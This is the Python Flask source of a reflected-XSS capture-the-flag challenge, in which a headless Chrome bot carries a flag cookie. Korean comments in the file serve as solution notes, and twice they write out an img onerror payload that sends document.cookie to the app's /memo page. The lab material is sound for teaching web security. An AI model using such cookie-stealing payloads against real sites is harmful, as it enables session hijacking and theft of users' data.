#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

# 메인 페이지
@app.route("/")
def index():
    return render_template("index.html")

# reflected xss이다. 하지만 xss-1과 다르게 xss가 바로 삽입되지 않는다. 그렇다면 <img> 또는 <iframe>을 써보는 것은 어떨까?
# <img src="https://www.w3schools.com/html/pic_trulli.jpg"> 이렇게 말이다.
# 하지만 쿠키는 어떻게 얻을까?? 이벤트 속성을 사용하면 된다!
# <img src="wrongURLimage.jpg" onerror="location.href='/memo?memo='.concat(document.cookie);">
@app.route("/vuln")
def vuln():
    return render_template("vuln.html")

# 서버가 크롬 창을 띄우게 해준다. 주소는 우리가 param변수에 지정해줄 수 있다.
# <img src="/memo?memo=flag01"+document.cookie> doesn't work
# <img src="wrongURLimage.jpg" onerror="location.href='/memo?memo='.concat(document.cookie);">
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html")
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


memo_text = ""

# param에 들어오는 값을 메모에 더해 화면에 출력해준다.
@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text)


app.run(host="0.0.0.0", port=8000)
